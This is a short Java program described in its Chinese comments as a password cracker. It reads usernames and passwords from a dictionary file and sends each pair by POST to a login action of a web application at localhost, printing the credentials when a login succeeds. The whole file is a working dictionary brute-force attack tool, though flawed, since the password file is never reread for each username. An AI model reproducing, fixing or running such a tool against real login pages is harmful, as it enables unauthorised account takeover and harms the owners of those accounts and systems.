package com.main.exe;

import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;

import com.util.fileutil.FileIo;
import com.util.net.SendRequest;

/**
 * 口令破解 读取字典后进行密码破解
 * 
 * @author Administrator
 *
 */
public class FuzzingExe {
	public static void main(String[] args) throws Exception {
		SendRequest sendRequest = new SendRequest();
		BufferedReader bufferedReaderUser = null;
		BufferedReader bufferedReaderPass = null;
		try {
			bufferedReaderUser = new BufferedReader(new FileReader("E:"
					+ FileIo.s + "dic" + FileIo.s + "6.dic"));
			bufferedReaderPass = new BufferedReader(new FileReader("E:"
					+ FileIo.s + "dic" + FileIo.s + "6.dic"));
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		try {
			String TempBufferedReaderUser = null;
			String TempBufferedReaderPass = null;
			while ((TempBufferedReaderUser = bufferedReaderUser.readLine()) != null) {
				while ((TempBufferedReaderPass = bufferedReaderPass.readLine()) != null) {
					if (true == sendRequest
							.SendReq(
									"localhost:8080/citicsp/core/login!ajaxLogin.action",
									"POST", TempBufferedReaderUser,
									TempBufferedReaderPass)) {
						System.out.println("破解成功 用户名是:"
								+ TempBufferedReaderUser + "密码是:"
								+ TempBufferedReaderPass);
						break;
					}
					System.out.println("口令错误");
				}
			}

		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}
}
